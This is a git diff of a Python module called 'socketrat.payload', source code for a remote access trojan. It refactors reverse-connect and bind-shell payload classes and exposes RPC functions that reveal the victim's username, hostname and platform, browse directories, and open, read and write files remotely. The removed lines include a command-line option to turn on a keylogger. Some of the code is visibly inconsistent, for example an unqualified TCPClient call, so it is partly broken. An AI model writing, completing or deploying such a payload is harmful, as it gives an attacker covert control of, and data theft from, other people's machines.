@@ -5,22 +5,8 @@ import socket
 import socketserver
 import sys
 
-from .. import connection
+from .. import sock
 from .. import rpc
-
-from . import *
-
-
-class TCPClient:
-
-    def __init__(self, addr):
-        self.addr = addr
-        self.retry_interval = 1
-
-    def connect_forever(self):
-        while True:
-            sock = socket.create_connection(self.addr)
-            time.sleep(self.retry_interval)
 
 
 class PayloadRPCDispatcher(rpc.RPCHandler):
@@ -42,7 +28,7 @@ class PayloadRPCDispatcher(rpc.RPCHandler):
 class PayloadRequestHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
-        self.server.handle_socket(self.request)
+        self.server.handle_request(self.request)
 
 
 class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):
@@ -56,123 +42,92 @@ class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):
         PayloadRPCDispatcher.__init__(self)
         socketserver.TCPServer.__init__(self, addr, requestHandler, bind_and_activate)
 
+    def handle_request(self, request):
+        conn = sock.Connection(request)
+        return self.handle_connection(conn)
 
-class TCPReversePayload(TCPClient, PayloadRPCDispatcher):
+
+class TCPReversePayload(sock.TCPClient, PayloadRPCDispatcher):
     
-    def __init__(self, addr):
-        pass
+    def __init__(self, addr, retry_interval=1):
+        TCPClient.__init__(self, addr, retry_interval)
 
 
-class FileService(FileOpener, FileReader, FileWriter):
-    pass
+def uname():
+    import platform
+    return platform.uname()
 
 
-def _linux_connect(args):
-    host, port = addr = args.host, args.port
-
-    with TCPReversePayload(addr) as payload:
-        funcs = [
-                get_username,
-                get_hostname,
-                get_platform,
-                list_dir,
-                change_dir,
-                get_current_dir,
-                get_file_size,
-                uname,
-        ]
-        for f in funcs:
-            payload.register_function(f)
-        payload.register_instance(FileService())
-        try:
-            payload.connect_forever()
-        except connection.ConnectionClosed:
-            pass
+def get_file_size(path):
+    import os
+    return os.path.getsize(path)
 
 
-def _linux_listen(args):
-    print(args)
-    print('listening')
+def get_username():
+    import getpass
+    return getpass.getuser()
 
 
-def _windows_main(args):
-    raise NotImplementedError
+def get_hostname():
+    import socket
+    return socket.gethostname()
 
 
-def _linux_main(args):
-    import argparse
-
-    parser = argparse.ArgumentParser(
-            prog='socketrat.payload',
-            prefix_chars='-+',
-    )
-    payload_group = parser.add_argument_group('payload arguments')
-    payload_group.add_argument('-cd',
-            help='Turn off change directory',
-            action='store_false',
-    )
-    payload_group.add_argument('+kl',
-            help='Turn on keylogger',
-            action='store_true',
-    )
-
-    subparsers = parser.add_subparsers(
-            dest='command',
-            help='Choose from the following commands:',
-            metavar='command',
-    )
-    subparsers.required = True
-
-    connect_parser = subparsers.add_parser('connect',
-            help='Connect to a socketrat server [reverse payload]'
-    )
-    connect_parser.set_defaults(func=_linux_connect)
-    connect_parser.add_argument('host',
-            help='Specify alternate hostname or IP address '
-                 '[default: localhost]',
-            default='localhost',
-            nargs='?',
-    )
-    connect_parser.add_argument('port',
-            help='Specify alternate port [default: 8000]',
-            default=8000,
-            nargs='?',
-    )
-
-    listen_parser = subparsers.add_parser('listen',
-            help='Listen for connections from a socketrat server [bind payload]',
-    )
-    listen_parser.set_defaults(func=_linux_listen)
-    listen_parser.add_argument('--bind', '-b',
-            help='Specify alternate bind address [default: all interfaces]',
-            metavar='ADDRESS',
-            default='0.0.0.0',
-    )
-    listen_parser.add_argument('port',
-            help='Specify alternate port [default: 8000]',
-            default=8000,
-            nargs='?',
-    )
-
-    args = parser.parse_args(args)
-    args.func(args)
-
-
-if platform.system() == 'Windows':
-    main = _windows_main
-elif platform.system() == 'Linux':
-    main = _linux_main
-else:
-    def main(*args, **kwargs):
-        raise NotImplementedError
-
-
-if __name__ == '__main__':
+def get_platform():
     import sys
+    return sys.platform
 
-    args = sys.argv[1:]
-    try:
-        main(args)
-    except NotImplementedError:
-        print('*** Platform not supported: {}'.format(platform.system()))
+
+def list_dir(path):
+    import os
+    return os.listdir(path)
+
+
+def change_dir(path):
+    import os
+    path = os.path.expanduser(path)
+    os.chdir(path)
+
+
+def get_current_dir():
+    import os
+    return os.getcwd()
+
+
+class FileOpener:
+
+    def __init__(self):
+        self.open_files = dict()
+
+    def open_file(self, path, mode='r'):
+        f = open(path, mode)
+        fid = id(f)
+        self.open_files[fid] = f
+        return fid
+
+    def close_file(self, fid):
+        if fid not in self.open_files:
+            return
+        f = self.open_files[fid]
+        f.close()
+        del self.open_files[fid]
+
+
+class FileReader:
+
+    def read_file(self, fid, size):
+        import base64
+        f = self.open_files[fid]
+        data = f.read(size)
+        return base64.urlsafe_b64encode(data)
+
+
+class FileWriter:
+
+    def write_file(self, fid, data):
+        import base64
+        f = self.open_files[fid]
+        data = base64.urlsafe_b64decode(data)
+        f.write(data)
+        f.flush()
 
